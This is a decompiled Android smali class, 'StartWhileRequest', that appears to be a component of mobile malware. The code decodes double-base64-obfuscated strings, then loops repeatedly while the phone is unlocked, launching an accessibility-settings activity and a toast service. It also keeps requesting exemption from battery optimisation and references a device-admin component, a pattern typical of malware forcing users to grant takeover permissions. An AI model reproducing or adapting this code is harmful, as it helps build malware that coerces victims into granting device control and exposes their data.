.class public Lnaqsl/ebxcb/exu/StartWhileRequest;
.super Landroid/app/IntentService;
.source ""


# instance fields
.field fddo:Lnaqsl/ebxcb/exu/ifdf;

.field for:I

.field ifdf:Lnaqsl/ebxcb/exu/int;

.field int:I


# direct methods
.method public constructor <init>()V
    .registers 2

    const-string v0, "StartWhileRequest"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lnaqsl/ebxcb/exu/ifdf;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/ifdf;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v0, Lnaqsl/ebxcb/exu/for;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/for;-><init>()V

    const/4 v0, 0x0

    iput v0, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->int:I

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    return-void
.end method


# virtual methods
.method protected onHandleIntent(Landroid/content/Intent;)V
    .registers 15

    const-string p1, "YzNSaGNuUlNaWEYxWlhOMA=="

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iget-object v1, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    iget v1, v1, Lnaqsl/ebxcb/exu/ifdf;->else:I

    const/16 v2, 0x17

    const/4 v3, 0x1

    if-nez v1, :cond_11

    goto :goto_19

    :cond_11
    if-ne v1, v3, :cond_14

    goto :goto_19

    :cond_14
    const/4 v4, 0x2

    if-ne v1, v4, :cond_19

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    :cond_19
    :goto_19
    const/4 v1, 0x0

    const-string v4, ""

    :try_start_1c
    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, p0, v5}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    if-nez v4, :cond_31

    invoke-virtual {v0, p0}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;)V
    :try_end_2d
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_2d} :catch_2e

    goto :goto_31

    :catch_2e
    invoke-virtual {v0, p0}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;)V

    :cond_31
    :goto_31
    const/16 v5, 0x2bc

    iput v5, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->for:I

    if-nez v1, :cond_4d

    :try_start_37
    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, p0, v4}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    if-nez v4, :cond_4d

    invoke-virtual {v0, p0}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;)V
    :try_end_48
    .catch Ljava/lang/Exception; {:try_start_37 .. :try_end_48} :catch_49

    goto :goto_4d

    :catch_49
    invoke-virtual {v0, p0}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;)V

    return-void

    :cond_4d
    :goto_4d
    const/4 v5, 0x5

    const/4 v6, -0x1

    if-lt v1, v5, :cond_52

    const/4 v1, -0x1

    :cond_52
    add-int/2addr v1, v3

    const-string v5, "UVdOalpYTnpQVEU9"

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    const-string v7, "VUdWeWJUMHg="

    invoke-static {v7}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    const-string v8, "device_policy"

    invoke-virtual {p0, v8}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/app/admin/DevicePolicyManager;

    new-instance v8, Landroid/content/ComponentName;

    const-class v9, Lnaqsl/ebxcb/exu/fddo/fddo/fddo;

    invoke-direct {v8, p0, v9}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    :try_start_7e
    sget-object v8, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    iget v9, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->for:I

    int-to-long v9, v9

    invoke-virtual {v8, v9, v10}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_86
    .catch Ljava/lang/InterruptedException; {:try_start_7e .. :try_end_86} :catch_87

    goto :goto_8b

    :catch_87
    move-exception v8

    invoke-virtual {v8}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_8b
    const-string v8, "keyguard"

    invoke-virtual {p0, v8}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/app/KeyguardManager;

    invoke-virtual {v8}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v8

    const/high16 v9, 0x40000000    # 2.0f

    const/high16 v10, 0x10000000

    if-nez v8, :cond_e9

    invoke-virtual {v0, p0}, Lnaqsl/ebxcb/exu/int;->new(Landroid/content/Context;)Z

    move-result v11

    if-nez v11, :cond_a9

    iget-object v12, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    iget v12, v12, Lnaqsl/ebxcb/exu/ifdf;->goto:I

    if-eq v12, v3, :cond_ad

    :cond_a9
    if-nez v11, :cond_e9

    if-eqz v5, :cond_e9

    :cond_ad
    invoke-virtual {v0, p0}, Lnaqsl/ebxcb/exu/int;->new(Landroid/content/Context;)Z

    move-result v5

    if-nez v5, :cond_e9

    :try_start_b3
    new-instance v5, Landroid/content/Intent;

    const-class v11, Lnaqsl/ebxcb/exu/Activity/ActivityAccessibility;

    invoke-direct {v5, p0, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v5, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v5}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V
    :try_end_c3
    .catch Ljava/lang/Exception; {:try_start_b3 .. :try_end_c3} :catch_c4

    goto :goto_c5

    :catch_c4
    nop

    :goto_c5
    const/16 v5, 0x1f4

    iput v5, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->for:I

    iget v5, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->int:I

    if-eqz v5, :cond_d0

    const/4 v11, 0x6

    if-ne v5, v11, :cond_dc

    :cond_d0
    :try_start_d0
    new-instance v5, Landroid/content/Intent;

    const-class v11, Lnaqsl/ebxcb/exu/ServiceToast;

    invoke-direct {v5, p0, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v5}, Landroid/app/IntentService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_da
    .catch Ljava/lang/Exception; {:try_start_d0 .. :try_end_da} :catch_db

    goto :goto_dc

    :catch_db
    nop

    :cond_dc
    :goto_dc
    iget v5, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->int:I

    add-int/2addr v5, v3

    iput v5, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->int:I

    iget v5, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->int:I

    const/16 v11, 0xa

    if-le v5, v11, :cond_e9

    iput v6, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->int:I

    :cond_e9
    if-nez v8, :cond_f1

    iget-object v5, p0, Lnaqsl/ebxcb/exu/StartWhileRequest;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    iget v5, v5, Lnaqsl/ebxcb/exu/ifdf;->goto:I

    if-eq v5, v3, :cond_f5

    :cond_f1
    if-nez v8, :cond_31

    if-eqz v7, :cond_31

    :cond_f5
    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v5, v2, :cond_31

    invoke-virtual {v0, p0}, Lnaqsl/ebxcb/exu/int;->this(Landroid/content/Context;)Z

    move-result v5

    if-nez v5, :cond_10a

    invoke-virtual {v0, p0}, Lnaqsl/ebxcb/exu/int;->new(Landroid/content/Context;)Z

    move-result v5

    if-eqz v5, :cond_10a

    :try_start_105
    invoke-virtual {v0, p0}, Lnaqsl/ebxcb/exu/int;->class(Landroid/content/Context;)V
    :try_end_108
    .catch Ljava/lang/Exception; {:try_start_105 .. :try_end_108} :catch_109

    goto :goto_10a

    :catch_109
    nop

    :cond_10a
    :goto_10a
    invoke-virtual {v0, p0}, Lnaqsl/ebxcb/exu/int;->new(Landroid/content/Context;)Z

    move-result v5

    if-eqz v5, :cond_31

    invoke-virtual {v0, p0}, Lnaqsl/ebxcb/exu/int;->this(Landroid/content/Context;)Z

    move-result v5

    if-eqz v5, :cond_31

    const-string v5, "power"

    invoke-virtual {p0, v5}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/os/PowerManager;

    invoke-virtual {p0}, Landroid/app/IntentService;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v5

    if-nez v5, :cond_31

    :try_start_128
    new-instance v5, Landroid/content/Intent;

    const-string v6, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "Y0dGamEyRm5aVG89"

    invoke-static {v8}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Landroid/app/IntentService;->getPackageName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    invoke-direct {v5, v6, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    invoke-virtual {v5, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v5}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V
    :try_end_159
    .catch Ljava/lang/Exception; {:try_start_128 .. :try_end_159} :catch_15b

    goto/16 :goto_31

    :catch_15b
    nop

    goto/16 :goto_31
.end method
